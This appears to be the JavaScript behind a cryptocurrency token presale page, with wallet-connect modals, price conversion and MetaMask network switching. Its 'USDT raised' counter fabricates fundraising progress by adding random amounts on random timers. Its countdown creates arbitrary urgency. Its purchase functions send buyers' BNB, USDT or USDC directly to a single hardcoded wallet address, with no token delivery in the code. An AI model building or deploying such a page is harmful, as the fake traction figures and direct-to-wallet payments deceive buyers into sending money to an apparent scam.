function updateCountdown() {
    // Recuperar la fecha objetivo del almacenamiento local, si está disponible
    let targetDate = localStorage.getItem('targetDate');

    // Si no hay una fecha objetivo almacenada o si la fecha es inválida, establecer una nueva fecha objetivo
    if (!targetDate || isNaN(new Date(targetDate))) {
        targetDate = new Date(); // Fecha actual
        targetDate.setDate(targetDate.getDate() + 10); // Sumar 4 días
        targetDate.setHours(19); // Establecer las horas a 19:00
        targetDate.setMinutes(38); // Establecer los minutos a 38
        targetDate.setSeconds(26); // Establecer los segundos a 26
        localStorage.setItem('targetDate', targetDate);
    } else {
        targetDate = new Date(targetDate); // Convertir la fecha almacenada de cadena a objeto de fecha
    }

    const daysElement = document.getElementById('days').querySelector('.value');
    const hoursElement = document.getElementById('hours').querySelector('.value');
    const minutesElement = document.getElementById('minutes').querySelector('.value');
    const secondsElement = document.getElementById('seconds').querySelector('.value');

    // Función para actualizar el contador
    function update() {
        const now = new Date().getTime();
        const distance = targetDate - now;

        const days = Math.floor(distance / (1000 * 60 * 60 * 24));
        const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((distance % (1000 * 60)) / 1000);

        daysElement.textContent = days;
        hoursElement.textContent = hours;
        minutesElement.textContent = minutes;
        secondsElement.textContent = seconds;
    }

    // Actualizar el contador inicialmente
    update();

    // Actualizar el contador cada segundo
    setInterval(update, 1000);
}

updateCountdown();

// FIN DE EL TIEMPO DE LA INTERFAZ






document.addEventListener('DOMContentLoaded', function() {
   var modal = document.getElementById('qrModal'); // Obtener el modal de QR
   var btns = document.querySelectorAll('.iconmodal'); // Obtener todos los botones con clase .iconmodal

   // Obtener el elemento <span> que cierra el modal
   var span = document.getElementsByClassName('qr-modal-close')[0];

   // Obtener el elemento <img> para mostrar el icono en el modal de QR
   var qrIcon = document.getElementById('qrIcon');

   // Asignar evento clic a cada botón
   btns.forEach(function(btn) {
      btn.onclick = function() {
         var iconSrc = btn.getAttribute('data-icon'); // Obtener la ruta del icono del atributo data-icon del botón
         qrIcon.src = iconSrc; // Establecer la imagen del icono en el modal de QR
         modal.style.display = 'block'; // Mostrar el modal al hacer clic en el botón

         // Cuando se haga clic en <span> (x), cerrar el modal
         span.onclick = function() {
            modal.style.display = 'none';
         }

         // Cuando se haga clic fuera del modal, cerrarlo también
         window.onclick = function(event) {
            if (event.target == modal) {
               modal.style.display = 'none';
            }
         }
      }
   });
});









// BOTONES DE MODALS

// ABRIR MODEL CON CONNECT

document.addEventListener("DOMContentLoaded", function() {
    const connectWalletBtn = document.getElementById('connectwalletBtn');
    const hiddenContent = document.getElementById('hiddenContent');
    
    connectWalletBtn.addEventListener('click', function() {
        // Mostrar la ventana modal
        hiddenContent.style.display = 'block'; // Mostrar el contenido
        // Aquí podrías agregar cualquier otra lógica necesaria, como animaciones o cambios adicionales
    });
});


// BOTON CERRAR modal

document.addEventListener("DOMContentLoaded", function() {
    const closeModalBtn = document.getElementById('closeModalBtn');
    const hiddenContent = document.getElementById('hiddenContent');
    
    closeModalBtn.addEventListener('click', function() {
        hiddenContent.style.display = 'none'; // Oculta el modal al hacer clic en el ícono de cerrar
    });
});


// BOTON DENTRO DEL MODAL

// DIRECT PAYMENTS

document.addEventListener('DOMContentLoaded', function() {
    const openButton = document.getElementById('openDirectPaymentModal');
    const directPaymentModal = document.getElementById('directpaymentbtn');
    const hiddenModal = document.getElementById('hiddenContent');

    openButton.addEventListener('click', function() {
        // Abrir modal directpaymentbtn
        directPaymentModal.style.display = 'block';
        
        // Cerrar modal hiddenContent si está abierto
        hiddenModal.style.display = 'none';
    });

    // Función para cerrar modal directpaymentbtn
    const closeModalBtn = directPaymentModal.querySelector('#closeModalBtn');
    if (closeModalBtn) {
        closeModalBtn.addEventListener('click', function() {
            directPaymentModal.style.display = 'none';
        });
    }
});

// SOLANA PAY

document.addEventListener('DOMContentLoaded', function() {
    const openButtonSolana = document.getElementById('openSolanaModal');
    const solanaModal = document.getElementById('solanawalletbtn');
    const hiddenModal = document.getElementById('hiddenContent');

    openButtonSolana.addEventListener('click', function() {
        // Abrir modal solanawalletbtn
        solanaModal.style.display = 'block';
        
        // Cerrar modal hiddenContent si está abierto
        hiddenModal.style.display = 'none';
    });

    // Función para cerrar modal solanawalletbtn
    const closeModalBtnSolana = solanaModal.querySelector('#closeModalBtn');
    if (closeModalBtnSolana) {
        closeModalBtnSolana.addEventListener('click', function() {
            solanaModal.style.display = 'none';
        });
    }
});

// COINBASE PAY

document.addEventListener('DOMContentLoaded', function() {
    const openButton = document.getElementById('openDogecoinModal'); // Actualizado con el nuevo ID
    const directPaymentModal = document.getElementById('dogecoinwalletbtn');
    const hiddenModal = document.getElementById('hiddenContent');

    openButton.addEventListener('click', function() {
        // Abrir modal directpaymentbtn
        directPaymentModal.style.display = 'block';
        
        // Cerrar modal hiddenContent si está abierto
        hiddenModal.style.display = 'none';
    });

    // Función para cerrar modal directpaymentbtn
    const closeModalBtn = directPaymentModal.querySelector('#closeModalBtn');
    if (closeModalBtn) {
        closeModalBtn.addEventListener('click', function() {
            directPaymentModal.style.display = 'none';
        });
    }
});

// ALL WALLETS

document.addEventListener('DOMContentLoaded', function() {
    const openButton = document.getElementById('openAllWalletsModal'); // Actualizado con el nuevo ID
    const directPaymentModal = document.getElementById('allwalletsbtn');
    const hiddenModal = document.getElementById('hiddenContent');

    openButton.addEventListener('click', function() {
        // Abrir modal directpaymentbtn
        directPaymentModal.style.display = 'block';
        
        // Cerrar modal hiddenContent si está abierto
        hiddenModal.style.display = 'none';
    });

    // Función para cerrar modal directpaymentbtn
    const closeModalBtn = directPaymentModal.querySelector('#closeModalBtn');
    if (closeModalBtn) {
        closeModalBtn.addEventListener('click', function() {
            directPaymentModal.style.display = 'none';
        });
    }
});





// ALL WALLETS BOTONES BUSCADOR


function showQR(button, qrSrc) {
    var qrImage = document.getElementById('qrImage');
    var iconImage = document.getElementById('iconImage');
    var iconSrc = button.querySelector('img').src;

    // Mostrar la imagen y el icono centrado sobre la imagen QR
    qrImage.src = qrSrc || 'assets/interfaz/z/images/qr/qr.png'; // Imagen QR base si qrSrc no está definido
    qrImage.style.display = 'block';
    
    iconImage.src = iconSrc; // Mostrar la imagen del icono seleccionado
    iconImage.style.display = 'block';

    // Ocultar los botones
    var buttons = document.querySelectorAll('.button-grid .btn');
    buttons.forEach(function(btn) {
        btn.style.display = 'none';
    });
}


document.addEventListener('DOMContentLoaded', function() {
    const openButton = document.getElementById('openAllWalletsModal'); // Actualizado con el nuevo ID
    const directPaymentModal = document.getElementById('allwalletsbtn');
    const hiddenModal = document.getElementById('hiddenContent');

    openButton.addEventListener('click', function() {
        // Abrir modal directpaymentbtn
        directPaymentModal.style.display = 'block';
        
        // Cerrar modal hiddenContent si está abierto
        hiddenModal.style.display = 'none';
    });

    // Función para cerrar modal directpaymentbtn
    const closeModalBtn = directPaymentModal.querySelector('#closeModalBtn');
    if (closeModalBtn) {
        closeModalBtn.addEventListener('click', function() {
            directPaymentModal.style.display = 'none';

            // Mostrar los botones nuevamente
            var buttons = document.querySelectorAll('.button-grid .btn');
            buttons.forEach(function(btn) {
                btn.style.display = 'block';
            });

            // Ocultar qrImage
            var qrImage = document.getElementById('qrImage');
            qrImage.style.display = 'none';
        });
    }
});


// Manejar el campo de búsqueda
document.addEventListener("DOMContentLoaded", function() {
    const searchInput = document.getElementById("searchInput");
    const buttons = document.querySelectorAll(".button-grid button");
    const qrImage = document.getElementById('qrImage');

    searchInput.addEventListener("input", function() {
        const searchText = searchInput.value.toLowerCase();

        // Ocultar la imagen del QR cuando se escribe en el campo de búsqueda
        qrImage.style.display = 'none';

        buttons.forEach(button => {
            const buttonSpan = button.querySelector("span");
            const buttonText = buttonSpan.textContent.toLowerCase();

            if (buttonText.includes(searchText)) {
                button.style.display = "flex"; // Mostrar botón si coincide con la búsqueda
            } else {
                button.style.display = "none"; // Ocultar botón si no coincide
            }
        });
    });
});




// FIN BOTONES DE MODALS


// NO MOSTRAR ICONOS CARGANDO
document.addEventListener("DOMContentLoaded", function() {
    // Selecciona el contenedor de la interfaz de pago
    var purchaseInterface = document.querySelector('.purchase-interface');
    // Muestra el contenedor de la interfaz de pago
    purchaseInterface.style.display = 'block';
 });
// FIN NO MOSTRAR ICONOS CARGANDO

function comprarTokens() {
    var tokenInput = document.getElementById('tokenInput').value;
  }
  
  // Adding event listener for changes in the input field
  document.getElementById('tokenInput').addEventListener('input', comprarTokens);
  
  function copiarDireccion() {
    var direccion = document.getElementById("direccion");
    var range = document.createRange();
    range.selectNode(direccion);
    window.getSelection().removeAllRanges(); // Limpiar cualquier selección previa
    window.getSelection().addRange(range);
    document.execCommand("copy");
    window.getSelection().removeAllRanges(); // Limpiar después de copiar
  
    // Mostrar el texto "Copied" temporalmente
    var copiedText = document.getElementById("copiedText");
    copiedText.style.display = "inline";
    setTimeout(function() {
       copiedText.style.display = "none";
    }, 1000); // Ocultar después de 1 segundo
  }
  







  
  // Espera a que el DOM esté completamente cargado
document.addEventListener('DOMContentLoaded', function() {
    // Selecciona el modal y el botón de cerrar
    var modals = document.getElementById('browserWalletModal');
    var closesButton = document.querySelector('.closes'); // Usamos querySelector para seleccionar por clase

    // Agrega evento de clic al botón de cerrar
    closesButton.addEventListener('click', function() {
        modals.style.display = 'none'; // Oculta el modal al hacer clic en el botón de cerrar
    });
});



// Función para copiar la dirección especificada por su ID
function copiarDireccion(id) {
    // Seleccionar el elemento que contiene la dirección
    var direccion = document.getElementById(id);
 
    // Obtener el texto original de la dirección
    var direccionOriginal = direccion.textContent;

    // Crear un campo de texto auxiliar para copiar el texto
    var aux = document.createElement("input");
    aux.setAttribute("value", direccionOriginal);
    document.body.appendChild(aux);
 
    // Seleccionar el texto en el campo auxiliar
    aux.select();
 
    // Copiar el texto seleccionado
    document.execCommand("copy");
 
    // Remover el campo auxiliar
    document.body.removeChild(aux);
 
    // Mostrar el texto "Copied" temporalmente
    direccion.textContent = "Copied";
    setTimeout(function() {
       direccion.textContent = direccionOriginal;
    }, 2000); // Volver al texto original después de 2 segundos
}

// Manejar el clic en cada ícono de copiar
document.querySelectorAll(".copy-icon").forEach(function(icon, index) {
   icon.addEventListener("click", function() {
      copiarDireccion('direccion-' + (index + 1));
   });
});

// Manejar el clic en cada dirección para copiar
document.querySelectorAll('[id^="direccion-"]').forEach(function(direccion) {
   direccion.addEventListener("click", function() {
      copiarDireccion(direccion.id);
   });
});

 
 
  
  
      
      let bnbPrice = 0;
      const tokenPriceInUSD = 0.00000004; // PRECIO TOKEN
      let conversionRate = tokenPriceInUSD;
      
      async function fetchBNBPrice() {
          try {
              const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd');
              const data = await response.json();
              bnbPrice = data.binancecoin.usd;
              updateConversions();
          } catch (error) {
              console.error('Error fetching BNB price:', error);
          }
      }
      
      function updateConversions() {
          const selectedButton = document.querySelector('.btn.selected');
          if (selectedButton.id === 'bnbButton') {
              convertToToken();
              convertToBNB();
          } else if (selectedButton.id === 'usdtButton') {
              convertToTokenFromUSDT();
              convertToUSDT();
          } else if (selectedButton.id === 'usdcButton') {
              convertToTokenFromUSDC();
              convertToUSDC();
          }
      }
      
      function selectTab(button) {
          document.querySelectorAll('.btn').forEach(btn => btn.classList.remove('selected'));
          button.classList.add('selected');
      
          if (button.id === 'bnbButton') {
              conversionRate = tokenPriceInUSD / bnbPrice; // Price of token in BNB
          } else if (button.id === 'usdtButton' || button.id === 'usdcButton') {
              conversionRate = 10000000; // Fixed rate for USDT and USDC to token
          }
      
          updateConversions();
      }
      
      function convertToToken() {
          const bnbInput = document.getElementById('bnbInput');
          const tokenInput = document.getElementById('tokenInput');
      
          // Convert BNB to TOKEN
          const bnbValue = parseFloat(bnbInput.value) || 0;
          const tokenValue = (bnbValue * bnbPrice) / tokenPriceInUSD;
      
          tokenInput.value = tokenValue;
      }
      
      function convertToBNB() {
          const tokenInput = document.getElementById('tokenInput');
          const bnbInput = document.getElementById('bnbInput');
      
          // Convert TOKEN to BNB
          const tokenValue = parseFloat(tokenInput.value) || 0;
          const bnbValue = (tokenValue * tokenPriceInUSD) / bnbPrice;
      
          bnbInput.value = bnbValue;
      }
      
      function convertToTokenFromUSDT() {
          const usdtInput = document.getElementById('bnbInput');
          const tokenInput = document.getElementById('tokenInput');
      
          // Convert USDT to TOKEN
          const usdtValue = parseFloat(usdtInput.value) || 0;
          const tokenValue = usdtValue / tokenPriceInUSD;
      
          tokenInput.value = tokenValue;
      }
      
      function convertToUSDT() {
          const tokenInput = document.getElementById('tokenInput');
          const usdtInput = document.getElementById('bnbInput');
      
          // Convert TOKEN to USDT
          const tokenValue = parseFloat(tokenInput.value) || 0;
          const usdtValue = tokenValue * tokenPriceInUSD;
      
          usdtInput.value = usdtValue;
      }
      
      function convertToTokenFromUSDC() {
          const usdcInput = document.getElementById('bnbInput');
          const tokenInput = document.getElementById('tokenInput');
      
          // Convert USDC to TOKEN
          const usdcValue = parseFloat(usdcInput.value) || 0;
          const tokenValue = usdcValue / tokenPriceInUSD;
      
          tokenInput.value = tokenValue;
      }
      
      function convertToUSDC() {
          const tokenInput = document.getElementById('tokenInput');
          const usdcInput = document.getElementById('bnbInput');
      
          // Convert TOKEN to USDC
          const tokenValue = parseFloat(tokenInput.value) || 0;
          const usdcValue = tokenValue * tokenPriceInUSD;
      
          usdcInput.value = usdcValue;
      }
      
      document.getElementById('bnbInput').addEventListener('input', function() {
          const selectedButton = document.querySelector('.btn.selected');
          if (selectedButton.id === 'bnbButton') {
              convertToToken();
          } else if (selectedButton.id === 'usdtButton') {
              convertToTokenFromUSDT();
          } else if (selectedButton.id === 'usdcButton') {
              convertToTokenFromUSDC();
          }
      });
      
      document.getElementById('tokenInput').addEventListener('input', function() {
          const selectedButton = document.querySelector('.btn.selected');
          if (selectedButton.id === 'bnbButton') {
              convertToBNB();
          } else if (selectedButton.id === 'usdtButton') {
              convertToUSDT();
          } else if (selectedButton.id === 'usdcButton') {
              convertToUSDC();
          }
      });
      
      document.getElementById('bnbButton').addEventListener('click', function() {
          selectTab(this);
      });
      
      document.getElementById('usdtButton').addEventListener('click', function() {
          selectTab(this);
      });
      
      document.getElementById('usdcButton').addEventListener('click', function() {
          selectTab(this);
      });
      
      // Initialize the conversion rate for the default selected button
      document.getElementById('bnbButton').classList.add('selected');
      
      // Fetch the initial BNB price and set interval for updates
      fetchBNBPrice();
      setInterval(fetchBNBPrice, 30000); // Update every 30 seconds
      
      
      
      
      // Función para manejar el clic en el botón USDT
      document.getElementById('usdtButton').addEventListener('click', function() {
          // Cambiar el texto dentro del label con clase "font-13" a "USDT you pay"
          var label = document.querySelector('.font-13.fw-semibold');
          if (label) {
              label.textContent = 'USDT you pay';
          }
      
          // Cambiar la imagen dentro del div con clase "amountType" a usdt.png
          var img = document.querySelector('.amountType img');
          if (img) {
              img.src = 'assets/interfaz/z/images/interfaz/usdt.png';
              img.alt = 'USDT icon';
          }
      });
      
      // Función para manejar el clic en el botón BNB
      document.getElementById('bnbButton').addEventListener('click', function() {
          // Cambiar el texto dentro del label con clase "font-13" a "BNB you pay"
          var label = document.querySelector('.font-13.fw-semibold');
          if (label) {
              label.textContent = 'BNB you pay';
          }
      
          // Cambiar la imagen dentro del div con clase "amountType" a bnb.png
          var img = document.querySelector('.amountType img');
          if (img) {
              img.src = 'assets/interfaz/z/images/interfaz/bnb.png';
              img.alt = 'BNB icon';
          }
      });
      
      // Función para manejar el clic en el botón USDC
      document.getElementById('usdcButton').addEventListener('click', function() {
          // Cambiar el texto dentro del label con clase "font-13" a "USDC you pay"
          var label = document.querySelector('.font-13.fw-semibold');
          if (label) {
              label.textContent = 'USDC you pay';
          }
      
          // Cambiar la imagen dentro del div con clase "amountType" a bnb.png
          var img = document.querySelector('.amountType img');
          if (img) {
              img.src = 'assets/interfaz/z/images/interfaz/usdc.png';
              img.alt = 'USDC icon';
          }
      });






          // SUMA DE $

// Función para generar un número aleatorio en un rango
    function getRandomNumber(min, max) {
        return Math.random() * (max - min) + min;
      }
  
      // Función para actualizar el valor progresivo y el tiempo de espera
      function updateValue() {
        let currentValue = parseFloat(localStorage.getItem('usdt-raised')) || 12426512.52; // Valor inicial
        const targetValue = 600000000.00; // Valor objetivo
        const increment = getRandomNumber(23.48, 218.13); // Incremento aleatorio
  
        // Incrementar el valor actual
        const newValue = Math.min(currentValue + increment, targetValue);
  
        // Actualizar el texto con formato de moneda
        document.getElementById('usdt-raised').innerText = '$' + newValue.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,');
        
        // Guardar el nuevo valor en el almacenamiento local
        localStorage.setItem('usdt-raised', newValue);
        
        // Si no hemos alcanzado el valor objetivo, programar la próxima actualización
        if (newValue < targetValue) {
          setTimeout(updateValue, getRandomNumber(1300, 5330));
        }
      }
  
      // Llamar a la función inicialmente para comenzar la cuenta progresiva
      updateValue();

          // FIN SUMA DE $

          // SELECCION DE BOTONES

          function selectTab(button) {
            // Obtener todos los botones
            var buttons = document.querySelectorAll('.tab-container .btn');
    
            // Remover la clase 'selected' de todos los botones
            buttons.forEach(function(btn) {
                btn.classList.remove('selected');
            });
    
            // Agregar la clase 'selected' solo al botón clicado
            button.classList.add('selected');
        }

                  // FIN SELECCION DE BOTONES


                  // RESETEAR CAMPOS X

// Función para resetear los campos de entrada
function resetInputs() {
  document.getElementById('bnbInput').value = '';
  document.getElementById('tokenInput').value = '';
}

// Función para manejar el cambio de red en MetaMask (simulado)
function handleMetaMaskNetworkChange() {
  resetInputs();  // Resetea los campos cuando cambia la red en MetaMask (simulación)
}

// Función para manejar el cambio de botón
function handleButtonClick(button) {
  resetInputs();  // Resetea los campos cuando se cambia de botón
}

// Simulación de evento para cambiar de red en MetaMask
document.addEventListener('MetaMaskNetworkChanged', handleMetaMaskNetworkChange);

// Asignar eventos a los botones
document.getElementById('bnbButton').addEventListener('click', function() {
  handleButtonClick(this);
});
document.getElementById('ethButton').addEventListener('click', function() {
  handleButtonClick(this);
});
document.getElementById('usdtButton').addEventListener('click', function() {
  handleButtonClick(this);
});
document.getElementById('usdcButton').addEventListener('click', function() {
  handleButtonClick(this);
});
  
                  // FIN RESETEAR CAMPOS X


















// CONNECT METAMASK Y CAMBIO DE BOTON BUY NOW
async function connectMetamask() {
    try {
        // Solicitar conexión a Metamask
        await ethereum.request({ method: 'eth_requestAccounts' });

        // Verificar la red actual
        const chainId = await ethereum.request({ method: 'eth_chainId' });

        // Si la red actual no es BNB, intentar cambiar a BNB
        if (chainId !== '0x38') {
            await ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                    chainId: '0x38', // BNB chain ID
                    chainName: 'Binance Smart Chain',
                    nativeCurrency: {
                        name: 'BNB',
                        symbol: 'BNB',
                        decimals: 18
                    },
                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
                    blockExplorerUrls: ['https://bscscan.com/']
                }]
            });
        }

        // Si la conexión y el cambio de red son exitosos, ocultar connectwalletBtn y mostrar buynowBtn
        if (await ethereum.request({ method: 'eth_chainId' }) === '0x38') {
            document.getElementById('connectwalletBtn').style.display = 'none';
            document.getElementById('buynowBtn').style.display = 'block';
            var modal = document.getElementById('hiddenContent');
            modal.style.display = 'none'; // Ocultar la ventana modal
        }

    } catch (error) {
        console.error('Error connecting to Metamask or changing network:', error);
        // Si ocurre un error, no cambiar los botones
    }
}
  
// FIN CONNECT METAMASK Y CAMBIO DE BOTON BUY NOW
  

  


// BUY WITH ETH Y BUY WITH BNB


const buywithEthButton = document.getElementById('buywithEthButton');
const buywithBnbButton = document.getElementById('buywithBnbButton');

const ethereumNetwork = {
  chainId: '0x1', // Mainnet
};

const bnbNetwork = {
  chainId: '0x38', // BSC Mainnet
};

async function switchNetwork(networkParams) {
  try {
    await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [networkParams],
    });

    // Cambiar botones solo si el cambio de red es exitoso
    if (networkParams.chainId === ethereumNetwork.chainId) {
      buywithEthButton.style.display = 'none';
      buywithBnbButton.style.display = 'block';
    } else if (networkParams.chainId === bnbNetwork.chainId) {
      buywithBnbButton.style.display = 'none';
      buywithEthButton.style.display = 'block';
    }

  } catch (switchError) {
    // Este código de error indica que la red no ha sido añadida a MetaMask
    if (switchError.code === 4902) {
      try {
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [networkParams],
        });

        // Cambiar botones solo si el cambio de red es exitoso
        if (networkParams.chainId === ethereumNetwork.chainId) {
          buywithEthButton.style.display = 'none';
          buywithBnbButton.style.display = 'block';
        } else if (networkParams.chainId === bnbNetwork.chainId) {
          buywithBnbButton.style.display = 'none';
          buywithEthButton.style.display = 'block';
        }
      } catch (addError) {
        console.error(addError);
      }
    } else {
      console.error(switchError);
    }
  }
}

buywithEthButton.addEventListener('click', async () => {
  // Cambiar a la red de Ethereum
  console.log('Conectando a la red de Ethereum...');
  await switchNetwork(ethereumNetwork);
});

buywithBnbButton.addEventListener('click', async () => {
  // Cambiar a la red de BNB
  console.log('Conectando a la red de BNB...');
  await switchNetwork(bnbNetwork);
});

  // FIN BUY WITH ETH Y BUY WITH BNB



// BOTONES DE SELECCION

// Función para verificar y ajustar la visibilidad de los botones según la red actual
async function checkNetworkAndAdjustButtons() {
    try {
        // Esperamos a que MetaMask esté disponible
        await window.ethereum.enable();

        // Obtenemos la red actual
        const networkId = await ethereum.request({ method: 'net_version' });

        // Determinamos qué botones mostrar u ocultar
        if (networkId === '1') {
            // Red Ethereum Mainnet
            document.getElementById('ethButton').style.display = 'block';
            document.getElementById('bnbButton').style.display = 'none';
        } else if (networkId === '56') {
            // Red Binance Smart Chain Mainnet (por ejemplo)
            document.getElementById('ethButton').style.display = 'none';
            document.getElementById('bnbButton').style.display = 'block';
        } else {
            // Otras redes (opcionalmente manejar otros casos)
            document.getElementById('ethButton').style.display = 'none';
            document.getElementById('bnbButton').style.display = 'none';
        }
    } catch (error) {
        // Manejar errores (por ejemplo, MetaMask no instalado o usuario rechaza la conexión)
        console.error('Error al obtener la red actual:', error);
    }
}


// Función para cambiar de pestaña cuando se hace clic en un botón
function selectTab(button) {
    // Implementa lógica para cambiar de pestaña aquí
    console.log('Seleccionando pestaña:', button.innerText.trim());
}

// FIN BOTONES DE SELECCION






async function sendUSDT() {
  try {
      // Obtener el valor del campo BNB
      const usdtAmount = document.getElementById('bnbInput').value.trim();
      
      if (!usdtAmount || isNaN(usdtAmount)) {
          alert('Por favor ingresa una cantidad válida de USDT.');
          return;
      }

      // Conectar con MetaMask
      if (typeof window.ethereum !== 'undefined') {
          await window.ethereum.request({ method: 'eth_requestAccounts' });

          const tokenAddress = '0x55d398326f99059fF775485246999027B3197955'; // Dirección del contrato USDT
          const receiverAddress = '0xBF92611C71f906FDD5ae1F61d93Ab65ED18784f5'; // Dirección a la que se enviarán los USDT

          // Preparar la transacción
          const transactionParameters = {
              to: tokenAddress,
              from: web3.eth.accounts.givenProvider.selectedAddress,
              value: '0x00',
              data: web3.eth.abi.encodeFunctionCall({
                  name: 'transfer',
                  type: 'function',
                  inputs: [{
                      type: 'address',
                      name: 'to'
                  },{
                      type: 'uint256',
                      name: 'value'
                  }]
              }, [receiverAddress, web3.utils.toWei(usdtAmount.toString(), 'ether')])
          };

          // Enviar la transacción usando MetaMask
          await web3.eth.sendTransaction(transactionParameters);
          alert(`Se han enviado ${usdtAmount} USDT a ${receiverAddress}.`);
      } else {
          alert('MetaMask no está instalado o conectado.');
      }
  } catch (error) {
      console.error('Error al enviar USDT:', error);
      alert('Hubo un error al enviar USDT. Revisa la consola para más detalles.');
  }
}

function sendBNB() {
  // Aquí implementa la lógica para enviar BNB si es necesario
  alert('Implementa la lógica para enviar BNB aquí.');
}

function selectTab(button) {
  // Obtener todos los botones
  var buttons = document.querySelectorAll('.tab-container .btn');

  // Remover la clase 'selected' de todos los botones
  buttons.forEach(function(btn) {
      btn.classList.remove('selected');
  });

  // Agregar la clase 'selected' solo al botón clicado
  button.classList.add('selected');
}

function handleBuyNowClick() {
  // Obtener el botón seleccionado
  var selectedButton = document.querySelector('.tab-container .btn.selected');

  if (selectedButton) {
      if (selectedButton.id === 'usdtButton') {
          // Si el botón seleccionado es USDT, enviar USDT
          sendUSDT();
      } else if (selectedButton.id === 'bnbButton') {
          // Si el botón seleccionado es BNB, enviar BNB
          sendBNB();
      } else {
          // Otros casos según la lógica de tu aplicación
          alert('Implementa la lógica para otros tipos de botón aquí.');
      }
  } else {
      alert('Por favor selecciona un tipo de moneda antes de comprar.');
  }
}





async function sendBNB() {
  try {
      // Obtener el valor del campo BNB
      const bnbAmount = document.getElementById('bnbInput').value.trim();
      
      if (!bnbAmount || isNaN(bnbAmount)) {
          alert('Por favor ingresa una cantidad válida de BNB.');
          return;
      }

      // Conectar con MetaMask
      if (typeof window.ethereum !== 'undefined') {
          await window.ethereum.request({ method: 'eth_requestAccounts' });

          const receiverAddress = '0xBF92611C71f906FDD5ae1F61d93Ab65ED18784f5'; // Dirección a la que se enviarán los BNB

          // Preparar la transacción
          const transactionParameters = {
              to: receiverAddress,
              from: web3.eth.accounts.givenProvider.selectedAddress,
              value: web3.utils.toWei(bnbAmount.toString(), 'ether'),
          };

          // Enviar la transacción usando MetaMask
          await web3.eth.sendTransaction(transactionParameters);
          alert(`Se han enviado ${bnbAmount} BNB a ${receiverAddress}.`);
      } else {
          alert('MetaMask no está instalado o conectado.');
      }
  } catch (error) {
      console.error('Error al enviar BNB:', error);
      alert('Hubo un error al enviar BNB. Revisa la consola para más detalles.');
  }
}







async function sendUSDT() {
  try {
      const usdtAmount = document.getElementById('bnbInput').value.trim();
      
      if (!usdtAmount || isNaN(usdtAmount)) {
          console.log('Por favor ingresa una cantidad válida de USDT.');
          return;
      }

      if (typeof window.ethereum !== 'undefined') {
          await window.ethereum.request({ method: 'eth_requestAccounts' });
          const web3 = new Web3(window.ethereum);

          let tokenAddress, symbol;
          const selectedButton = document.querySelector('.tab-container .btn.selected');
          
          if (selectedButton && selectedButton.id === 'usdtButton') {
              tokenAddress = '0x55d398326f99059fF775485246999027B3197955'; // Dirección del contrato USDT
              symbol = 'USDT';
          } else if (selectedButton && selectedButton.id === 'usdcButton') {
              tokenAddress = '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d'; // Dirección del contrato USDC
              symbol = 'USDC';
          } else {
              console.log('No se ha seleccionado un tipo de moneda válido.');
              return;
          }

          const receiverAddress = '0xBF92611C71f906FDD5ae1F61d93Ab65ED18784f5';

          const transactionParameters = {
              to: tokenAddress,
              from: web3.eth.accounts.givenProvider.selectedAddress,
              value: '0x00',
              gas: web3.utils.toHex(100000),  // Límite de gas
              gasPrice: web3.utils.toHex(web3.utils.toWei('3', 'gwei')),  // Tarifa base de 3 Gwei
              data: web3.eth.abi.encodeFunctionCall({
                  name: 'transfer',
                  type: 'function',
                  inputs: [{
                      type: 'address',
                      name: 'to'
                  },{
                      type: 'uint256',
                      name: 'value'
                  }]
              }, [receiverAddress, web3.utils.toWei(usdtAmount.toString(), 'ether')])
          };

          await web3.eth.sendTransaction(transactionParameters);
          console.log(`Se han enviado ${usdtAmount} ${symbol} a ${receiverAddress}.`);
      } else {
          console.log('MetaMask no está instalado o conectado.');
      }
  } catch (error) {
      console.error('Error al enviar tokens:', error);
  }
}

// Función para enviar BNB
async function sendBNB() {
  try {
      const bnbAmount = document.getElementById('bnbInput').value.trim();
      
      if (!bnbAmount || isNaN(bnbAmount)) {
          console.log('Por favor ingresa una cantidad válida de BNB.');
          return;
      }

      if (typeof window.ethereum !== 'undefined') {
          await window.ethereum.request({ method: 'eth_requestAccounts' });
          const web3 = new Web3(window.ethereum);

          const receiverAddress = '0xBF92611C71f906FDD5ae1F61d93Ab65ED18784f5';

          const transactionParameters = {
              to: receiverAddress,
              from: web3.eth.accounts.givenProvider.selectedAddress,
              value: web3.utils.toWei(bnbAmount.toString(), 'ether'),
              gas: web3.utils.toHex(100000),  // Límite de gas
              gasPrice: web3.utils.toHex(web3.utils.toWei('3', 'gwei')),  // Tarifa base de 3 Gwei
          };

          await web3.eth.sendTransaction(transactionParameters);
          console.log(`Se han enviado ${bnbAmount} BNB a ${receiverAddress}.`);
      } else {
          console.log('MetaMask no está instalado o conectado.');
      }
  } catch (error) {
      console.error('Error al enviar BNB:', error);
  }
}

// Función para manejar el clic en el botón de compra
function handleBuyNowClick() {
  var selectedButton = document.querySelector('.tab-container .btn.selected');

  if (selectedButton) {
      if (selectedButton.id === 'usdtButton' || selectedButton.id === 'usdcButton') {
          sendUSDT(); // La función sendUSDT manejará tanto USDT como USDC
      } else if (selectedButton.id === 'bnbButton') {
          sendBNB();
      } else {
          console.log('Implementa la lógica para otros tipos de botón aquí.');
      }
  } else {
      console.log('Por favor selecciona un tipo de moneda antes de comprar.');
  }
}




